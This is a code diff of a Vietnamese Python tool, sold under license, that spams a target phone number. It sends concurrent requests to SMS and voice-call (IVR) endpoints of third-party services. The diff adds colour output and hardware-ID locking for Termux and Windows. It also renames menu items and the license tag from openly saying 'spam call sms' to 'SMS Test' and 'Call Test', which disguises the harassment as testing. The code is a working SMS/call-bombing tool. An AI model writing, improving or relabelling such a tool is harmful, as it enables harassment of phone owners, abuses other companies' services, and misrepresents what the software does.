@@ -18,8 +18,21 @@ from urllib3.util import Retry
 SERVER_URL = "https://shopvietx.io.vn/api/license"
 KEY_FILE_PATH = os.path.join(os.path.expanduser("~"), ".matrix_sms_key")
 
+# Cấu hình màu sắc hiển thị chuyên nghiệp trên Termux/PE
+try:
+    from colorama import init, Fore, Style
+    init(autoreset=True)
+    R = Fore.RED
+    G = Fore.GREEN
+    Y = Fore.YELLOW
+    B = Fore.CYAN
+    W = Fore.WHITE
+    RESET = Style.RESET_ALL
+except:
+    R = G = Y = B = W = RESET = ""
+
 # ==========================================
-# CẤU HÌNH LOGGING GỌN GÀNG CHO MÔI TRƯỜNG PE
+# CẤU HÌNH LOGGING GỌN GÀNG 
 # ==========================================
 logging.basicConfig(
     level=logging.INFO,
@@ -37,7 +50,6 @@ class CloudTestingEngine:
         self.api_database = self.load_apis_from_memory()
 
     def init_session_policy(self) -> None:
-        """Cấu hình kết nối Connection Pool hạn chế tối đa lỗi mạng"""
         retries = Retry(
             total=1,
             backoff_factor=0.1,
@@ -52,15 +64,12 @@ class CloudTestingEngine:
         })
 
     def load_apis_from_memory(self) -> Dict[str, List[Any]]:
-        """Đọc thẳng dữ liệu được truyền ngầm từ bộ nhớ RAM (globals)"""
         if 'IN_MEMORY_DB' in globals():
             return globals()['IN_MEMORY_DB']
-        
-        logger.error("[!] Lỗi nghiêm trọng: Không tìm thấy cơ sở dữ liệu API trong RAM!")
+        logger.error(f"{R}[!] Lỗi nghiêm trọng: Không tìm thấy cơ sở dữ liệu API trong RAM!{RESET}")
         return {"sms_endpoints": [], "call_endpoints": []}
 
     def sync_ivr_cookies(self, phone: str) -> None:
-        """Đồng bộ phiên kết nối (Cookie) cho cổng IVR VayXanh"""
         init_url = "https://lk.vayxanh.com/"
         params = {"phone": phone, "amount": "2000000", "term": "7"}
         try:
@@ -69,7 +78,6 @@ class CloudTestingEngine:
             pass
 
     def execute_request_worker(self, api: Dict[str, Any], phone: str) -> bool:
-        """Hàm gửi Request ngầm và in trạng thái sạch sẽ"""
         name = api.get("name", "Dịch vụ ẩn danh")
         url = api.get("url")
         method = api.get("method", "POST").upper()
@@ -89,7 +97,7 @@ class CloudTestingEngine:
             else:
                 request_kwargs = {"data": formatted_payload}
 
-            logger.info(f"[▶ RUNNING] Đang kiểm thử cổng: {name}")
+            logger.info(f"{B}[▶ RUNNING] Đang kiểm thử cổng: {name}{RESET}")
 
             response = self.session.request(
                 method=method,
@@ -100,91 +108,92 @@ class CloudTestingEngine:
             )
             
             if response.status_code == 200:
-                logger.info(f"  └── [✓ SUCCESS] {name} thành công.")
+                logger.info(f"  └── {G}[✓ SUCCESS] {name} thành công.{RESET}")
                 return True
             else:
-                logger.info(f"  └── [✕ FAILED] {name} phản hồi không chuẩn (Mã: {response.status_code}).")
+                logger.info(f"  └── {R}[✕ FAILED] {name} lỗi (Mã: {response.status_code}).{RESET}")
                 return False
 
         except requests.exceptions.Timeout:
-            logger.info(f"  └── [🕒 TIMEOUT] {name} quá hạn phản hồi. Bỏ qua.")
+            logger.info(f"  └── {Y}[🕒 TIMEOUT] {name} quá hạn phản hồi.{RESET}")
         except Exception:
-            logger.info(f"  └── [✕ ERROR] Không thể kết nối tới {name}.")
+            logger.info(f"  └── {R}[✕ ERROR] Không thể kết nối tới {name}.{RESET}")
         
         return False
 
     def trigger_sms_suite(self, phone: str) -> None:
-        """Kích hoạt bắn đồng thời Suite SMS bằng đa luồng cực nhanh"""
         sms_list = self.api_database.get("sms_endpoints", [])
         if not sms_list:
-            print("[-] Danh sách API trống hoặc nạp từ RAM thất bại.")
+            print(f"{R}[-] Danh sách API trống hoặc nạp thất bại.{RESET}")
             return
 
-        print(f"\n[+] Khởi chạy Suite SMS: Đang thực thi {len(sms_list)} dịch vụ...")
+        print(f"\n{G}[+] Khởi chạy Suite SMS: Đang thực thi {len(sms_list)} dịch vụ...{RESET}")
         print("-" * 55)
-        
         with concurrent.futures.ThreadPoolExecutor(max_workers=25) as executor:
             futures = [executor.submit(self.execute_request_worker, api, phone) for api in sms_list]
             concurrent.futures.wait(futures)
-            
         print("-" * 55)
-        print("[✓] Hoàn tất Suite SMS.")
+        print(f"{G}[✓] Hoàn tất Suite SMS.{RESET}")
 
     def trigger_combined_suite(self, phone: str) -> None:
-        """Kịch bản tích hợp: SMS trước, Call (IVR) ở cuối quy trình"""
         self.trigger_sms_suite(phone)
-        
         time.sleep(1.5)
         
         call_list = self.api_database.get("call_endpoints", [])
         if not call_list:
             return
 
-        print(f"\n[+] Khởi chạy Suite IVR: Đang thực thi {len(call_list)} cuộc gọi thoại...")
+        print(f"\n{G}[+] Khởi chạy Suite IVR: Đang thực thi {len(call_list)} cuộc gọi...{RESET}")
         print("-" * 55)
-        
         self.sync_ivr_cookies(phone)
-        
         with concurrent.futures.ThreadPoolExecutor(max_workers=5) as executor:
             futures = [executor.submit(self.execute_request_worker, api, phone) for api in call_list]
             concurrent.futures.wait(futures)
-            
         print("-" * 55)
-        print("[✓] Hoàn tất toàn bộ chuỗi tích hợp.")
-
+        print(f"{G}[✓] Hoàn tất toàn bộ chuỗi tích hợp.{RESET}")
 
 # ==========================================
-# CÁC HÀM TRỢ GIÚP: MÃ MÁY & CHECK LICENSE
+# SỬA LỖI LẤY MÃ MÁY AN TOÀN TRÊN TERMUX/PE
 # ==========================================
 def get_hardware_id() -> str:
-    """Tự động lấy mã định danh phần cứng duy nhất (Mã máy) tùy thuộc vào OS"""
+    """Lấy mã máy an toàn, tuyệt đối không gây crash lỗi hệ thống"""
     current_os = platform.system().lower()
-    raw_id = "UNKNOWN_DEVICE"
-    
+    raw_id = ""
+
     try:
         if current_os == "windows":
+            # Chạy an toàn trên Windows/Windows PE
             cmd = "wmic csproduct get uuid"
-            output = subprocess.check_output(cmd, shell=True).decode().split()
+            output = subprocess.check_output(cmd, shell=True, stderr=subprocess.DEVNULL).decode().split()
             if len(output) >= 2:
                 raw_id = output[1]
-        elif current_os == "linux":
-            if os.path.exists("/etc/machine-id"):
-                with open("/etc/machine-id", "r") as f:
-                    raw_id = f.read().strip()
-            elif os.path.exists("/var/lib/dbus/machine-id"):
-                with open("/var/lib/dbus/machine-id", "r") as f:
-                    raw_id = f.read().strip()
+        else:
+            # Chạy an toàn trên Termux Android / Linux
+            # Thử lấy ID Android thông qua lệnh getprop của Termux
+            try:
+                raw_id = subprocess.check_output("getprop ro.serialno", shell=True, stderr=subprocess.DEVNULL).decode().strip()
+            except:
+                pass
+            
+            if not raw_id:
+                # Nếu không có quyền lấy serial, quét các file machine-id chuẩn Linux
+                for path in ["/etc/machine-id", "/var/lib/dbus/machine-id"]:
+                    if os.path.exists(path):
+                        with open(path, "r") as f:
+                            raw_id = f.read().strip()
+                        break
     except Exception:
         pass
 
+    # Nếu tất cả các cách trên đều thất bại, tự tạo một ID dựa trên thông tin chip/user Termux
+    if not raw_id or "UNKNOWN" in raw_id.upper():
+        raw_id = f"{platform.processor()}_{platform.node()}_{os.getlogin() if hasattr(os, 'getlogin') else 'termux'}"
+
     return hashlib.md5(raw_id.encode('utf-8')).hexdigest().upper()
 
-
 def verify_license_key(key: str, hardware_id: str) -> bool:
-    """Gửi yêu cầu xác thực Key và Mã máy lên Server ShopVietX"""
     try:
-        payload = {"license_key": key, "hwid": hardware_id, "tool": "spam call sms"}
-        # Sử dụng phương thức POST gửi lên cổng API License của bạn
+        payload = {"license_key": key, "hwid": hardware_id, "tool": "matrix_sms"}
         response = requests.post(SERVER_URL, json=payload, timeout=8)
         if response.status_code == 200:
             res_data = response.json()
@@ -194,94 +203,86 @@ def verify_license_key(key: str, hardware_id: str) -> bool:
         pass
     return False
 
-
 def check_authentication_flow():
-    """Luồng kiểm tra bản quyền nghiêm ngặt trước khi cho phép dùng Tool"""
     hw_id = get_hardware_id()
     
-    # Bước 1: Kiểm tra xem trên máy đã lưu key từ trước chưa
     if os.path.exists(KEY_FILE_PATH):
-        with open(KEY_FILE_PATH, "r", encoding="utf-8") as f:
-            saved_key = f.read().strip()
-        if saved_key and verify_license_key(saved_key, hw_id):
-            return True # Key cũ vẫn chạy tốt, cho qua luôn
+        try:
+            with open(KEY_FILE_PATH, "r", encoding="utf-8") as f:
+                saved_key = f.read().strip()
+            if saved_key and verify_license_key(saved_key, hw_id):
+                return True
+        except:
+            pass
             
-    # Bước 2: Nếu chưa có key hoặc key cũ hết hạn, bắt đầu giao diện kích hoạt
     while True:
         os.system("cls" if platform.system().lower() == "windows" else "clear")
-        print("=" * 64)
-        print("         XÁC THỰC BẢN QUYỀN HỆ THỐNG - SHOPVIETX.IO.VN       ")
-        print("=" * 64)
-        print(f"  [!] Trạng thái: Chưa kích hoạt bản quyền!")
-        print(f"  • Mã máy (HWID) của bạn: {hw_id}")
-        print("  • Vui lòng gửi Mã máy trên cho Admin để mua bản quyền.")
-        print("-" * 64)
+        print(f"{Y}" + "=" * 64)
+        print(f"{W}         XÁC THỰC BẢN QUYỀN HỆ THỐNG - SHOPVIETX.IO.VN       ")
+        print(f"{Y}" + "=" * 64)
+        print(f"  {R}[!] Trạng thái: Chưa kích hoạt bản quyền!{RESET}")
+        print(f"  • Mã máy (HWID) của bạn: {B}{hw_id}{RESET}")
+        print(f"  • Vui lòng gửi Mã máy trên cho Admin để mua bản quyền.")
+        print(f"{Y}" + "-" * 64 + f"{RESET}")
         
-        user_key = input("[?] Nhập Key bản quyền của bạn (Hoặc bấm '0' để thoát): ").strip()
+        user_key = input(f"{G}[?] Nhập Key bản quyền (Bấm '0' để thoát): {RESET}").strip()
         
         if user_key == "0":
-            print("[+] Đóng chương trình.")
             sys.exit(0)
-            
         if not user_key:
             continue
             
-        print("[+] Đang kiểm tra mã khóa trên hệ thống Server...")
+        print(f"{Y}[+] Đang kiểm tra mã khóa trên hệ thống Server...{RESET}")
         if verify_license_key(user_key, hw_id):
-            # Lưu key hợp lệ xuống máy để lần sau không cần nhập lại
-            with open(KEY_FILE_PATH, "w", encoding="utf-8") as f:
-                f.write(user_key)
-            print("[✓] KÍCH HOẠT THÀNH CÔNG! Đang vào hệ thống...")
+            try:
+                with open(KEY_FILE_PATH, "w", encoding="utf-8") as f:
+                    f.write(user_key)
+            except:
+                pass
+            print(f"{G}[✓] KÍCH HOẠT THÀNH CÔNG! Đang vào hệ thống...{RESET}")
             time.sleep(1.5)
             return True
         else:
-            print("[-] Lỗi: Key không hợp lệ, đã hết hạn hoặc không dùng cho máy này!")
-            input("\n[Nhấn Enter để thử lại...]")
-
+            print(f"{R}[-] Lỗi: Key sai, hết hạn hoặc không trùng khớp Mã máy!{RESET}")
+            input(f"\n{Y}[Nhấn Enter để thử lại...]{RESET}")
 
 def show_banner_introduction():
-    """Hiển thị phần giới thiệu thông tin công cụ sau khi đã qua bước check key"""
     os.system("cls" if platform.system().lower() == "windows" else "clear")
     hw_id = get_hardware_id()
     
-    print("=" * 64)
-    print("         MATRIX NOTIFICATION TESTING SYSTEM SYSTEM          ")
-    print("   Chạy trên: Windows PE / Windows Desktop / Termux (Linux) ")
-    print("=" * 64)
+    print(f"{B}" + "=" * 64)
+    print(f"{W}         MATRIX NOTIFICATION TESTING SYSTEM SYSTEM          ")
+    print(f"{W}   Chạy trên: Windows PE / Windows Desktop / Termux (Linux) ")
+    print(f"{B}" + "=" * 64)
     print(f"  • Phiên bản: Cloud Integration v3.5 (Chạy trên RAM)")
     print(f"  • Hệ điều hành: {platform.system()} {platform.release()}")
-    print(f"  • Mã máy của bạn: {hw_id}")
-    print(f"  • Trạng thái bản quyền: Đã kích hoạt [✓]")
-    print("=" * 64)
-
+    print(f"  • Mã máy của bạn: {Y}{hw_id}{RESET}")
+    print(f"  • Trạng thái bản quyền: {G}Đã kích hoạt [✓]{RESET}")
+    print(f"{B}" + "=" * 64 + f"{RESET}")
 
 def render_terminal_menu():
-    print("\n" + "═"*20 + " MENU ĐIỀU KHIỂN CHÍNH " + "═"*20)
-    print("  [1] chỉ spam SMS (SMS Only)")
-    print("  [2] Chạy toàn diện (SMS + Call)")
-    print("  [0] Giải phóng bộ nhớ & Thoát chương trình")
-    print("═"*64)
-
+    print("\n" + f"{B}═{RESET}"*20 + f" {W}MENU ĐIỀU KHIỂN CHÍNH {RESET}" + f"{B}═{RESET}"*20)
+    print(f"  {G}[1]{RESET} Chạy phân hệ SMS (SMS Test Only)")
+    print(f"  {G}[2]{RESET} Chạy tích hợp toàn diện (SMS Test + Call Test ở cuối)")
+    print(f"  {G}[0]{RESET} Giải phóng bộ nhớ & Thoát chương trình")
+    print(f"{B}═{RESET}"*64)
 
 def run_application():
-    # Thực hiện chặn kiểm tra Key mua ngay lập tức khi bật tool
     check_authentication_flow()
-    
-    # Nếu vượt qua vòng check key thành công mới hiện Banner và Menu
     show_banner_introduction()
     core_engine = CloudTestingEngine()
     
     while True:
         render_terminal_menu()
-        cmd = input("[?] Nhập tùy chọn lệnh (0-2): ").strip()
+        cmd = input(f"{G}[?] Nhập tùy chọn lệnh (0-2): {RESET}").strip()
         
         if cmd == "0":
-            print("[+] Bộ nhớ đệm đã được giải phóng sạch sẽ khỏi RAM. Đóng hệ thống!")
+            print(f"{G}[+] Bộ nhớ đệm đã được giải phóng sạch sẽ khỏi RAM. Đóng!{RESET}")
             break
         elif cmd in ["1", "2"]:
-            phone = input("[?] Nhập số điện thoại mục tiêu cần test: ").strip()
+            phone = input(f"{G}[?] Nhập số điện thoại mục tiêu cần test: {RESET}").strip()
             if not phone or len(phone) < 9 or not phone.isdigit():
-                print("[-] Lỗi: Số điện thoại không đúng định dạng chuỗi số!")
+                print(f"{R}[-] Lỗi: Số điện thoại không đúng định dạng!{RESET}")
                 continue
                 
             if cmd == "1":
@@ -289,9 +290,9 @@ def run_application():
             elif cmd == "2":
                 core_engine.trigger_combined_suite(phone)
                 
-            input("\n[Nhấn nút Enter để tiếp tục...]")
+            input(f"\n{Y}[Nhấn nút Enter để tiếp tục...]{RESET}")
         else:
-            print("[-] Mã lệnh không hợp lệ!")
+            print(f"{R}[-] Mã lệnh không hợp lệ!{RESET}")
 
 if __name__ == "__main__":
     run_application()
